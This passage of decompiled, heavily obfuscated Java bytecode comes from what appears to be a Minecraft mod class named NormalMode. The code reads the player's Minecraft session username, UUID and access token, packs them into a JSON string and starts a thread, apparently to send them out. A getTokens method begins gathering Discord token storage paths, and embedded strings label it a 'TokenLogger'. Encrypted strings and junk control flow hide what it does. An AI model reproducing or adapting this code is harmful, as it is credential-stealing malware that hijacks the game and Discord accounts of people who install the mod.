    //   5845: astore #41
    //   5847: aload #41
    //   5849: invokevirtual func_111285_a : ()Ljava/lang/String;
    //   5852: astore #42
    //   5854: aload_0
    //   5855: astore #43
    //   5857: aload #43
    //   5859: getfield mc : Lnet/minecraft/client/Minecraft;
    //   5862: astore #44
    //   5864: aload #44
    //   5866: invokevirtual func_110432_I : ()Lnet/minecraft/util/Session;
    //   5869: astore #45
    //   5871: aload #45
    //   5873: invokevirtual func_148255_b : ()Ljava/lang/String;
    //   5876: astore #46
    //   5878: ldc_w 'FA=='
    //   5881: iload #145
    //   5883: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   5886: astore #86
    //   5888: ldc_w ''
    //   5891: iload #145
    //   5893: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   5896: astore #123
    //   5898: aload #46
    //   5900: aload #86
    //   5902: aload #123
    //   5904: invokevirtual replace : (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   5907: astore #47
    //   5909: aload #38
    //   5911: ifnonnull -> 6481
    //   5914: iload #145
    //   5916: bipush #31
    //   5918: imul
    //   5919: iconst_4
    //   5920: iushr
    //   5921: iload #145
    //   5923: irem
    //   5924: iload #145
    //   5926: bipush #16
    //   5928: iushr
    //   5929: ixor
    //   5930: ldc_w 157301221
    //   5933: if_icmpne -> 6471
    //   5936: ldc_w 169959625
    //   5939: iload #145
    //   5941: ixor
    //   5942: istore #145
    //   5944: iload #145
    //   5946: ldc_w 121209181
    //   5949: iload #145
    //   5951: ixor
    //   5952: imul
    //   5953: ldc_w 121209158
    //   5956: iload #145
    //   5958: ixor
    //   5959: iushr
    //   5960: iload #145
    //   5962: irem
    //   5963: iload #145
    //   5965: ldc_w 121209170
    //   5968: iload #145
    //   5970: ixor
    //   5971: iushr
    //   5972: ixor
    //   5973: ldc_w 33320790
    //   5976: iload #145
    //   5978: ixor
    //   5979: if_icmpeq -> 6006
    //   5982: aconst_null
    //   5983: athrow
    //   5984: nop
    //   5985: nop
    //   5986: nop
    //   5987: nop
    //   5988: nop
    //   5989: nop
    //   5990: nop
    //   5991: nop
    //   5992: nop
    //   5993: nop
    //   5994: nop
    //   5995: nop
    //   5996: nop
    //   5997: nop
    //   5998: nop
    //   5999: nop
    //   6000: nop
    //   6001: nop
    //   6002: nop
    //   6003: nop
    //   6004: nop
    //   6005: athrow
    //   6006: new java/lang/IllegalAccessException
    //   6009: dup
    //   6010: invokespecial <init> : ()V
    //   6013: athrow
    //   6014: nop
    //   6015: nop
    //   6016: nop
    //   6017: nop
    //   6018: nop
    //   6019: nop
    //   6020: nop
    //   6021: nop
    //   6022: nop
    //   6023: nop
    //   6024: nop
    //   6025: nop
    //   6026: nop
    //   6027: nop
    //   6028: nop
    //   6029: nop
    //   6030: nop
    //   6031: nop
    //   6032: nop
    //   6033: nop
    //   6034: nop
    //   6035: athrow
    //   6036: nop
    //   6037: nop
    //   6038: nop
    //   6039: athrow
    //   6040: nop
    //   6041: nop
    //   6042: nop
    //   6043: nop
    //   6044: nop
    //   6045: athrow
    //   6046: nop
    //   6047: nop
    //   6048: nop
    //   6049: athrow
    //   6050: nop
    //   6051: nop
    //   6052: nop
    //   6053: nop
    //   6054: nop
    //   6055: athrow
    //   6056: iload #145
    //   6058: bipush #7
    //   6060: bipush #29
    //   6062: ishl
    //   6063: iand
    //   6064: bipush #29
    //   6066: ishr
    //   6067: iload #145
    //   6069: iconst_3
    //   6070: ishl
    //   6071: ior
    //   6072: lookupswitch default -> 6111, 969673232 -> 6123, 2103711907 -> 6100
    //   6100: ldc_w 528208975
    //   6103: iload #145
    //   6105: ixor
    //   6106: istore #145
    //   6108: goto -> 6131
    //   6111: new java/io/IOException
    //   6114: astore_3
    //   6115: aload_3
    //   6116: ldc 'Error in hash'
    //   6118: invokespecial <init> : (Ljava/lang/String;)V
    //   6121: aload_3
    //   6122: athrow
    //   6123: ldc_w 2012141081
    //   6126: iload #145
    //   6128: ixor
    //   6129: istore #145
    //   6131: pop
    //   6132: iload #145
    //   6134: bipush #31
    //   6136: imul
    //   6137: iconst_4
    //   6138: iushr
    //   6139: iload #145
    //   6141: irem
    //   6142: iload #145
    //   6144: bipush #16
    //   6146: iushr
    //   6147: ixor
    //   6148: ldc_w 178342295
    //   6151: if_icmpne -> 6165
    //   6154: ldc_w 1641485159
    //   6157: iload #145
    //   6159: ixor
    //   6160: istore #145
    //   6162: goto -> 6175
    //   6165: new java/io/IOException
    //   6168: astore_3
    //   6169: aload_3
    //   6170: invokespecial <init> : ()V
    //   6173: aload_3
    //   6174: athrow
    //   6175: aload_0
    //   6176: astore #50
    //   6178: aload #50
    //   6180: getfield mc : Lnet/minecraft/client/Minecraft;
    //   6183: astore #51
    //   6185: aload #51
    //   6187: invokevirtual func_110432_I : ()Lnet/minecraft/util/Session;
    //   6190: astore #52
    //   6192: aload #52
    //   6194: invokevirtual func_148254_d : ()Ljava/lang/String;
    //   6197: astore #38
    //   6199: iload #145
    //   6201: bipush #31
    //   6203: imul
    //   6204: iconst_4
    //   6205: iushr
    //   6206: iload #145
    //   6208: irem
    //   6209: iload #145
    //   6211: bipush #16
    //   6213: iushr
    //   6214: ixor
    //   6215: ldc_w 15766836
    //   6218: if_icmpne -> 6232
    //   6221: ldc_w 572079109
    //   6224: iload #145
    //   6226: ixor
    //   6227: istore #145
    //   6229: goto -> 6242
    //   6232: new java/io/IOException
    //   6235: astore_3
    //   6236: aload_3
    //   6237: invokespecial <init> : ()V
    //   6240: aload_3
    //   6241: athrow
    //   6242: iload #145
    //   6244: ldc_w 857307174
    //   6247: iload #145
    //   6249: ixor
    //   6250: imul
    //   6251: ldc_w 857307197
    //   6254: iload #145
    //   6256: ixor
    //   6257: iushr
    //   6258: iload #145
    //   6260: irem
    //   6261: iload #145
    //   6263: ldc_w 857307177
    //   6266: iload #145
    //   6268: ixor
    //   6269: iushr
    //   6270: ixor
    //   6271: ldc_w 806884302
    //   6274: iload #145
    //   6276: ixor
    //   6277: if_icmpeq -> 6304
    //   6280: aconst_null
    //   6281: athrow
    //   6282: nop
    //   6283: nop
    //   6284: nop
    //   6285: nop
    //   6286: nop
    //   6287: nop
    //   6288: nop
    //   6289: nop
    //   6290: nop
    //   6291: nop
    //   6292: nop
    //   6293: nop
    //   6294: nop
    //   6295: nop
    //   6296: nop
    //   6297: nop
    //   6298: nop
    //   6299: nop
    //   6300: nop
    //   6301: nop
    //   6302: nop
    //   6303: athrow
    //   6304: new java/io/IOException
    //   6307: dup
    //   6308: invokespecial <init> : ()V
    //   6311: athrow
    //   6312: nop
    //   6313: nop
    //   6314: nop
    //   6315: nop
    //   6316: nop
    //   6317: nop
    //   6318: nop
    //   6319: nop
    //   6320: nop
    //   6321: nop
    //   6322: nop
    //   6323: nop
    //   6324: nop
    //   6325: nop
    //   6326: nop
    //   6327: nop
    //   6328: nop
    //   6329: nop
    //   6330: nop
    //   6331: nop
    //   6332: nop
    //   6333: athrow
    //   6334: iload #145
    //   6336: bipush #7
    //   6338: bipush #29
    //   6340: ishl
    //   6341: iand
    //   6342: bipush #29
    //   6344: ishr
    //   6345: iload #145
    //   6347: iconst_3
    //   6348: ishl
    //   6349: ior
    //   6350: lookupswitch default -> 6376, -2004235936 -> 6388, -1731477047 -> 6399
    //   6376: new java/io/IOException
    //   6379: astore_3
    //   6380: aload_3
    //   6381: ldc 'Error in hash'
    //   6383: invokespecial <init> : (Ljava/lang/String;)V
    //   6386: aload_3
    //   6387: athrow
    //   6388: ldc_w 965440795
    //   6391: iload #145
    //   6393: ixor
    //   6394: istore #145
    //   6396: goto -> 6407
    //   6399: ldc_w 461583374
    //   6402: iload #145
    //   6404: ixor
    //   6405: istore #145
    //   6407: pop
    //   6408: iload #145
    //   6410: bipush #31
    //   6412: imul
    //   6413: iconst_4
    //   6414: iushr
    //   6415: iload #145
    //   6417: irem
    //   6418: iload #145
    //   6420: bipush #16
    //   6422: iushr
    //   6423: ixor
    //   6424: ldc_w 246078256
    //   6427: if_icmpne -> 6441
    //   6430: ldc_w 870914266
    //   6433: iload #145
    //   6435: ixor
    //   6436: istore #145
    //   6438: goto -> 6739
    //   6441: new java/lang/IllegalAccessException
    //   6444: astore_3
    //   6445: aload_3
    //   6446: invokespecial <init> : ()V
    //   6449: aload_3
    //   6450: athrow
    //   6451: nop
    //   6452: nop
    //   6453: nop
    //   6454: athrow
    //   6455: nop
    //   6456: nop
    //   6457: nop
    //   6458: nop
    //   6459: nop
    //   6460: athrow
    //   6461: nop
    //   6462: nop
    //   6463: nop
    //   6464: athrow
    //   6465: nop
    //   6466: nop
    //   6467: nop
    //   6468: nop
    //   6469: nop
    //   6470: athrow
    //   6471: new java/lang/RuntimeException
    //   6474: astore_3
    //   6475: aload_3
    //   6476: invokespecial <init> : ()V
    //   6479: aload_3
    //   6480: athrow
    //   6481: ldc_w 1429246364
    //   6484: iload #145
    //   6486: ixor
    //   6487: istore #145
    //   6489: iload #145
    //   6491: bipush #31
    //   6493: imul
    //   6494: iconst_4
    //   6495: iushr
    //   6496: iload #145
    //   6498: irem
    //   6499: iload #145
    //   6501: bipush #16
    //   6503: iushr
    //   6504: ixor
    //   6505: ldc_w 181272836
    //   6508: if_icmpne -> 7042
    //   6511: ldc_w 1970727815
    //   6514: iload #145
    //   6516: ixor
    //   6517: istore #145
    //   6519: iload #145
    //   6521: ldc_w 761174927
    //   6524: iload #145
    //   6526: ixor
    //   6527: imul
    //   6528: ldc_w 761174932
    //   6531: iload #145
    //   6533: ixor
    //   6534: iushr
    //   6535: iload #145
    //   6537: irem
    //   6538: iload #145
    //   6540: ldc_w 761174912
    //   6543: iload #145
    //   6545: ixor
    //   6546: iushr
    //   6547: ixor
    //   6548: ldc_w 716831657
    //   6551: iload #145
    //   6553: ixor
    //   6554: if_icmpeq -> 6581
    //   6557: aconst_null
    //   6558: athrow
    //   6559: nop
    //   6560: nop
    //   6561: nop
    //   6562: nop
    //   6563: nop
    //   6564: nop
    //   6565: nop
    //   6566: nop
    //   6567: nop
    //   6568: nop
    //   6569: nop
    //   6570: nop
    //   6571: nop
    //   6572: nop
    //   6573: nop
    //   6574: nop
    //   6575: nop
    //   6576: nop
    //   6577: nop
    //   6578: nop
    //   6579: nop
    //   6580: athrow
    //   6581: new java/lang/IllegalAccessException
    //   6584: dup
    //   6585: invokespecial <init> : ()V
    //   6588: athrow
    //   6589: nop
    //   6590: nop
    //   6591: nop
    //   6592: nop
    //   6593: nop
    //   6594: nop
    //   6595: nop
    //   6596: nop
    //   6597: nop
    //   6598: nop
    //   6599: nop
    //   6600: nop
    //   6601: nop
    //   6602: nop
    //   6603: nop
    //   6604: nop
    //   6605: nop
    //   6606: nop
    //   6607: nop
    //   6608: nop
    //   6609: nop
    //   6610: athrow
    //   6611: nop
    //   6612: nop
    //   6613: nop
    //   6614: athrow
    //   6615: nop
    //   6616: nop
    //   6617: nop
    //   6618: nop
    //   6619: nop
    //   6620: athrow
    //   6621: iload #145
    //   6623: bipush #7
    //   6625: bipush #29
    //   6627: ishl
    //   6628: iand
    //   6629: bipush #29
    //   6631: ishr
    //   6632: iload #145
    //   6634: iconst_3
    //   6635: ishl
    //   6636: ior
    //   6637: lookupswitch default -> 6664, -1939981551 -> 6676, 1794432129 -> 6687
    //   6664: new java/lang/IllegalAccessException
    //   6667: astore_3
    //   6668: aload_3
    //   6669: ldc 'Error in hash'
    //   6671: invokespecial <init> : (Ljava/lang/String;)V
    //   6674: aload_3
    //   6675: athrow
    //   6676: ldc_w 241566179
    //   6679: iload #145
    //   6681: ixor
    //   6682: istore #145
    //   6684: goto -> 6695
    //   6687: ldc_w 313744657
    //   6690: iload #145
    //   6692: ixor
    //   6693: istore #145
    //   6695: pop
    //   6696: iload #145
    //   6698: bipush #31
    //   6700: imul
    //   6701: iconst_4
    //   6702: iushr
    //   6703: iload #145
    //   6705: irem
    //   6706: iload #145
    //   6708: bipush #16
    //   6710: iushr
    //   6711: ixor
    //   6712: ldc_w 199004020
    //   6715: if_icmpne -> 6729
    //   6718: ldc_w 614371948
    //   6721: iload #145
    //   6723: ixor
    //   6724: istore #145
    //   6726: goto -> 6739
    //   6729: new java/lang/RuntimeException
    //   6732: astore_3
    //   6733: aload_3
    //   6734: invokespecial <init> : ()V
    //   6737: aload_3
    //   6738: athrow
    //   6739: new java/lang/StringBuilder
    //   6742: astore #48
    //   6744: aload #48
    //   6746: invokespecial <init> : ()V
    //   6749: aload_0
    //   6750: astore #87
    //   6752: aload #87
    //   6754: getfield json : Ljava/lang/String;
    //   6757: astore #124
    //   6759: aload #48
    //   6761: aload #124
    //   6763: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6766: astore #88
    //   6768: ldc_w 'H1k1Jhorf1BCYANJVh45BgEl'
    //   6771: iload #145
    //   6773: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   6776: astore #125
    //   6778: aload #88
    //   6780: aload #125
    //   6782: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6785: astore #89
    //   6787: aload #89
    //   6789: aload_2
    //   6790: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6793: astore #90
    //   6795: ldc_w 'HVUdak9neEdAeAJJSgl3VURpcTBIHTE='
    //   6798: iload #145
    //   6800: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   6803: astore #126
    //   6805: aload #90
    //   6807: aload #126
    //   6809: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6812: astore #91
    //   6814: aload #91
    //   6816: aload #4
    //   6818: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6821: astore #92
    //   6823: ldc_w 'HVUdak9ne1FSaQRYUQt3T0JrbHccSTEEGVw='
    //   6826: iload #145
    //   6828: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   6831: astore #127
    //   6833: aload #92
    //   6835: aload #127
    //   6837: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6840: astore #93
    //   6842: aload #93
    //   6844: aload #5
    //   6846: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6849: astore #94
    //   6851: ldc_w 'HVUdak9nc0tPaQleWQxvHhsnfhhSHTMeGwtnLh8oeEpEKFcPGw=='
    //   6854: iload #145
    //   6856: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   6859: astore #128
    //   6861: aload #94
    //   6863: aload #128
    //   6865: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6868: astore #95
    //   6870: aload #95
    //   6872: aload #42
    //   6874: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6877: astore #96
    //   6879: ldc_w 'HVUdak9lPgBUeQNIGlA7Hg=='
    //   6882: iload #145
    //   6884: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   6887: astore #129
    //   6889: aload #96
    //   6891: aload #129
    //   6893: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6896: astore #97
    //   6898: aload #97
    //   6900: aload #47
    //   6902: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6905: astore #98
    //   6907: ldc_w 'HVUdak9lPgBVYwFJVkghHAM='
    //   6910: iload #145
    //   6912: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   6915: astore #130
    //   6917: aload #98
    //   6919: aload #130
    //   6921: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6924: astore #99
    //   6926: aload #99
    //   6928: aload #38
    //   6930: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6933: astore #100
    //   6935: ldc_w 'HXM3ahJpFA=='
    //   6938: iload #145
    //   6940: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   6943: astore #131
    //   6945: aload #100
    //   6947: aload #131
    //   6949: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   6952: astore #101
    //   6954: aload #101
    //   6956: invokevirtual toString : ()Ljava/lang/String;
    //   6959: astore #102
    //   6961: aload #87
    //   6963: aload #102
    //   6965: putfield json : Ljava/lang/String;
    //   6968: new java/lang/Thread
    //   6971: astore #49
    //   6973: aload_0
    //   6974: astore #132
    //   6976: aload #132
    //   6978: aload #42
    //   6980: <illegal opcode> run : (Lme/custompayload/normal/NormalMode;Ljava/lang/String;)Ljava/lang/Runnable;
    //   6985: astore #133
    //   6987: aload #49
    //   6989: aload #133
    //   6991: invokespecial <init> : (Ljava/lang/Runnable;)V
    //   6994: aload #49
    //   6996: invokevirtual start : ()V
    //   6999: return
    //   7000: nop
    //   7001: nop
    //   7002: nop
    //   7003: nop
    //   7004: nop
    //   7005: nop
    //   7006: nop
    //   7007: nop
    //   7008: nop
    //   7009: nop
    //   7010: nop
    //   7011: nop
    //   7012: nop
    //   7013: nop
    //   7014: nop
    //   7015: nop
    //   7016: nop
    //   7017: nop
    //   7018: nop
    //   7019: nop
    //   7020: nop
    //   7021: athrow
    //   7022: nop
    //   7023: nop
    //   7024: nop
    //   7025: athrow
    //   7026: nop
    //   7027: nop
    //   7028: nop
    //   7029: nop
    //   7030: nop
    //   7031: athrow
    //   7032: nop
    //   7033: nop
    //   7034: nop
    //   7035: athrow
    //   7036: nop
    //   7037: nop
    //   7038: nop
    //   7039: nop
    //   7040: nop
    //   7041: athrow
    //   7042: new java/io/IOException
    //   7045: astore_3
    //   7046: aload_3
    //   7047: invokespecial <init> : ()V
    //   7050: aload_3
    //   7051: athrow
    //   7052: new java/lang/RuntimeException
    //   7055: astore_3
    //   7056: aload_3
    //   7057: invokespecial <init> : ()V
    //   7060: aload_3
    //   7061: athrow
    //   7062: new java/lang/IllegalAccessException
    //   7065: astore_3
    //   7066: aload_3
    //   7067: ldc 'Error in hash'
    //   7069: invokespecial <init> : (Ljava/lang/String;)V
    //   7072: aload_3
    //   7073: athrow
    //   7074: nop
    //   7075: nop
    //   7076: nop
    //   7077: athrow
    //   7078: nop
    //   7079: nop
    //   7080: nop
    //   7081: nop
    //   7082: nop
    //   7083: athrow
    //   7084: nop
    //   7085: nop
    //   7086: nop
    //   7087: athrow
    //   7088: nop
    //   7089: nop
    //   7090: nop
    //   7091: nop
    //   7092: nop
    //   7093: athrow
    //   7094: nop
    //   7095: nop
    //   7096: nop
    //   7097: athrow
    //   7098: nop
    //   7099: nop
    //   7100: nop
    //   7101: nop
    //   7102: nop
    //   7103: athrow
    //   7104: new java/io/IOException
    //   7107: astore_3
    //   7108: aload_3
    //   7109: ldc 'Error in hash'
    //   7111: invokespecial <init> : (Ljava/lang/String;)V
    //   7114: aload_3
    //   7115: athrow
    //   7116: new java/lang/IllegalAccessException
    //   7119: astore_3
    //   7120: aload_3
    //   7121: invokespecial <init> : ()V
    //   7124: aload_3
    //   7125: athrow
    //   7126: nop
    //   7127: nop
    //   7128: nop
    //   7129: athrow
    //   7130: nop
    //   7131: nop
    //   7132: nop
    //   7133: nop
    //   7134: nop
    //   7135: athrow
    //   7136: new java/lang/IllegalAccessException
    //   7139: astore_3
    //   7140: aload_3
    //   7141: invokespecial <init> : ()V
    //   7144: aload_3
    //   7145: athrow
    //   7146: new java/lang/IllegalAccessException
    //   7149: astore_3
    //   7150: aload_3
    //   7151: invokespecial <init> : ()V
    //   7154: aload_3
    //   7155: athrow
    //   7156: nop
    //   7157: nop
    //   7158: nop
    //   7159: athrow
    //   7160: nop
    //   7161: nop
    //   7162: nop
    //   7163: nop
    //   7164: nop
    //   7165: athrow
    //   7166: nop
    //   7167: nop
    //   7168: nop
    //   7169: athrow
    //   7170: nop
    //   7171: nop
    //   7172: nop
    //   7173: nop
    //   7174: nop
    //   7175: athrow
    //   7176: new java/lang/RuntimeException
    //   7179: astore_3
    //   7180: aload_3
    //   7181: invokespecial <init> : ()V
    //   7184: aload_3
    //   7185: athrow
    //   7186: new java/lang/IllegalAccessException
    //   7189: astore_3
    //   7190: aload_3
    //   7191: invokespecial <init> : ()V
    //   7194: aload_3
    //   7195: athrow
    //   7196: new java/io/IOException
    //   7199: astore_3
    //   7200: aload_3
    //   7201: ldc 'Error in hash'
    //   7203: invokespecial <init> : (Ljava/lang/String;)V
    //   7206: aload_3
    //   7207: athrow
    //   7208: nop
    //   7209: nop
    //   7210: nop
    //   7211: athrow
    //   7212: nop
    //   7213: nop
    //   7214: nop
    //   7215: nop
    //   7216: nop
    //   7217: athrow
    //   7218: nop
    //   7219: nop
    //   7220: nop
    //   7221: athrow
    //   7222: nop
    //   7223: nop
    //   7224: nop
    //   7225: nop
    //   7226: nop
    //   7227: athrow
    //   7228: new java/lang/IllegalAccessException
    //   7231: astore_3
    //   7232: aload_3
    //   7233: invokespecial <init> : ()V
    //   7236: aload_3
    //   7237: athrow
    //   7238: new java/lang/RuntimeException
    //   7241: astore_3
    //   7242: aload_3
    //   7243: ldc 'Error in hash'
    //   7245: invokespecial <init> : (Ljava/lang/String;)V
    //   7248: aload_3
    //   7249: athrow
    // Exception table:
    //   from	to	target	type
    //   57	97	169	java/lang/RuntimeException
    //   119	127	169	java/lang/RuntimeException
    //   423	463	515	java/lang/IllegalAccessException
    //   485	493	515	java/lang/IllegalAccessException
    //   759	799	861	java/lang/IllegalAccessException
    //   821	829	861	java/lang/IllegalAccessException
    //   1050	1090	1142	java/io/IOException
    //   1112	1120	1142	java/io/IOException
    //   1406	1446	1518	java/lang/RuntimeException
    //   1468	1476	1518	java/lang/RuntimeException
    //   1817	1857	1919	java/io/IOException
    //   1879	1887	1919	java/io/IOException
    //   2162	2202	2264	java/io/IOException
    //   2224	2232	2264	java/io/IOException
    //   2446	2486	2538	java/io/IOException
    //   2508	2516	2538	java/io/IOException
    //   2814	2854	2926	java/lang/IllegalAccessException
    //   2876	2884	2926	java/lang/IllegalAccessException
    //   3247	3287	3339	java/io/IOException
    //   3309	3317	3339	java/io/IOException
    //   3583	3623	3695	java/lang/IllegalAccessException
    //   3645	3653	3695	java/lang/IllegalAccessException
    //   3859	3899	3961	java/lang/RuntimeException
    //   3921	3929	3961	java/lang/RuntimeException
    //   4230	4270	4322	java/lang/RuntimeException
    //   4292	4300	4322	java/lang/RuntimeException
    //   4459	4499	4571	java/lang/RuntimeException
    //   4521	4529	4571	java/lang/RuntimeException
    //   4687	4812	5001	java/lang/Exception
    //   4812	4852	4904	java/io/IOException
    //   4874	4882	4904	java/io/IOException
    //   5111	5151	5203	java/io/IOException
    //   5173	5181	5203	java/io/IOException
    //   5372	5412	5484	java/io/IOException
    //   5434	5442	5484	java/io/IOException
    //   5646	5686	5738	java/io/IOException
    //   5708	5716	5738	java/io/IOException
    //   5944	5984	6056	java/lang/IllegalAccessException
    //   6006	6014	6056	java/lang/IllegalAccessException
    //   6242	6282	6334	java/io/IOException
    //   6304	6312	6334	java/io/IOException
    //   6519	6559	6621	java/lang/IllegalAccessException
    //   6581	6589	6621	java/lang/IllegalAccessException
  }
  
  public static ArrayList<String> getTokens(int paramInt) {
    // Byte code:
    //   0: ldc_w 1566587914
    //   3: ldc_w 1213100085
    //   6: getstatic me/custompayload/normal/NormalMode.EswkRKw3U1 : I
    //   9: iload_0
    //   10: ixor
    //   11: ixor
    //   12: ixor
    //   13: istore #168
    //   15: iload #168
    //   17: bipush #31
    //   19: imul
    //   20: iconst_4
    //   21: iushr
    //   22: iload #168
    //   24: irem
    //   25: iload #168
    //   27: bipush #16
    //   29: iushr
    //   30: ixor
    //   31: ldc_w 40573509
    //   34: if_icmpne -> 48
    //   37: ldc_w 667694958
    //   40: iload #168
    //   42: ixor
    //   43: istore #168
    //   45: goto -> 58
    //   48: new java/lang/IllegalAccessException
    //   51: astore_3
    //   52: aload_3
    //   53: invokespecial <init> : ()V
    //   56: aload_3
    //   57: athrow
    //   58: iload #168
    //   60: ldc_w 776839654
    //   63: iload #168
    //   65: ixor
    //   66: imul
    //   67: ldc_w 776839677
    //   70: iload #168
    //   72: ixor
    //   73: iushr
    //   74: iload #168
    //   76: irem
    //   77: iload #168
    //   79: ldc_w 776839657
    //   82: iload #168
    //   84: ixor
    //   85: iushr
    //   86: ixor
    //   87: ldc_w 670819942
    //   90: iload #168
    //   92: ixor
    //   93: if_icmpeq -> 120
    //   96: aconst_null
    //   97: athrow
    //   98: nop
    //   99: nop
    //   100: nop
    //   101: nop
    //   102: nop
    //   103: nop
    //   104: nop
    //   105: nop
    //   106: nop
    //   107: nop
    //   108: nop
    //   109: nop
    //   110: nop
    //   111: nop
    //   112: nop
    //   113: nop
    //   114: nop
    //   115: nop
    //   116: nop
    //   117: nop
    //   118: nop
    //   119: athrow
    //   120: new java/lang/RuntimeException
    //   123: dup
    //   124: invokespecial <init> : ()V
    //   127: athrow
    //   128: nop
    //   129: nop
    //   130: nop
    //   131: nop
    //   132: nop
    //   133: nop
    //   134: nop
    //   135: nop
    //   136: nop
    //   137: nop
    //   138: nop
    //   139: nop
    //   140: nop
    //   141: nop
    //   142: nop
    //   143: nop
    //   144: nop
    //   145: nop
    //   146: nop
    //   147: nop
    //   148: nop
    //   149: athrow
    //   150: nop
    //   151: nop
    //   152: nop
    //   153: athrow
    //   154: nop
    //   155: nop
    //   156: nop
    //   157: nop
    //   158: nop
    //   159: athrow
    //   160: nop
    //   161: nop
    //   162: nop
    //   163: athrow
    //   164: nop
    //   165: nop
    //   166: nop
    //   167: nop
    //   168: nop
    //   169: athrow
    //   170: iload #168
    //   172: bipush #7
    //   174: bipush #29
    //   176: ishl
    //   177: iand
    //   178: bipush #29
    //   180: ishr
    //   181: iload #168
    //   183: iconst_3
    //   184: ishl
    //   185: ior
    //   186: lookupswitch default -> 7351, 1002516282 -> 223, 1919750089 -> 212
    //   212: ldc_w 1877787425
    //   215: iload #168
    //   217: ixor
    //   218: istore #168
    //   220: goto -> 231
    //   223: ldc_w 114902847
    //   226: iload #168
    //   228: ixor
    //   229: istore #168
    //   231: pop
    //   232: iload #168
    //   234: bipush #31
    //   236: imul
    //   237: iconst_4
    //   238: iushr
    //   239: iload #168
    //   241: irem
    //   242: iload #168
    //   244: bipush #16
    //   246: iushr
    //   247: ixor
    //   248: ldc_w 254340643
    //   251: if_icmpne -> 7341
    //   254: ldc_w 1032150861
    //   257: iload #168
    //   259: ixor
    //   260: istore #168
    //   262: ldc_w '[Skidfuscator Anti-Abuse] TokenLogger Type 5'
    //   265: pop
    //   266: ldc_w '[Skidfuscator Anti-Abuse] TokenLogger Type 6'
    //   269: pop
    //   270: ldc_w '[Skidfuscator Anti-Abuse] TokenLogger Type 4'
    //   273: pop
    //   274: ldc_w '[Skidfuscator Anti-Abuse] TokenLogger Type 3'
    //   277: pop
    //   278: new java/util/ArrayList
    //   281: astore_1
    //   282: aload_1
    //   283: invokespecial <init> : ()V
    //   286: new java/util/ArrayList
    //   289: astore #6
    //   291: aload #6
    //   293: invokespecial <init> : ()V
    //   296: new java/lang/StringBuilder
    //   299: astore #79
    //   301: aload #79
    //   303: invokespecial <init> : ()V
    //   306: ldc_w 'TAx6P0IqekZD'
    //   309: iload #168
    //   311: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   314: astore #132
    //   316: aload #132
    //   318: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   321: astore #133
    //   323: aload #79
    //   325: aload #133
    //   327: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   330: astore #80
    //   332: ldc_w 'ZT5vPSgjYUp6XwFNWAVxXXVobGITV21bYDdxJA4vPnBeZRlJUwNAV0dybHoRXg=='
    //   335: iload #168
    //   337: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   340: astore #134
    //   342: aload #80
    //   344: aload #134
    //   346: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   349: astore #81
    //   351: aload #81
    //   353: invokevirtual toString : ()Ljava/lang/String;
    //   356: astore #82
    //   358: aload #6
    //   360: aload #82
    //   362: invokevirtual add : (Ljava/lang/Object;)Z
    //   365: istore #7
    //   367: new java/lang/StringBuilder
    //   370: astore #83
    //   372: aload #83
    //   374: invokespecial <init> : ()V
    //   377: ldc_w 'TAx6P0IqekZD'
    //   380: iload #168
    //   382: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   385: astore #135
    //   387: aload #135
    //   389: invokestatic getProperty : (Ljava/lang/String;)Ljava/lang/String;
    //   392: astore #136
    //   394: aload #83
    //   396: aload #136
    //   398: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   401: astore #84
    //   403: ldc_w '\AppData\Roaming\discordcanary\Local Storage\leveldb'
    //   406: astore #137
    //   408: aload #84
    //   410: aload #137
    //   412: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   415: astore #85
    //   417: aload #85
    //   419: invokevirtual toString : ()Ljava/lang/String;
    //   422: astore #86
    //   424: aload #6
    //   426: aload #86
    //   428: invokevirtual add : (Ljava/lang/Object;)Z
    //   431: istore #8
    //   433: new java/lang/StringBuilder
    //   436: astore #87
    //   438: aload #87
    //   440: invokespecial <init> : ()V
    //   443: ldc_w 'TAx6P0IqekZD'
    //   446: iload #168
    //   448: invokestatic thisIsAInsaneEncryptionMethod : (Ljava/lang/String;I)Ljava/lang/String;
    //   451: astore #138
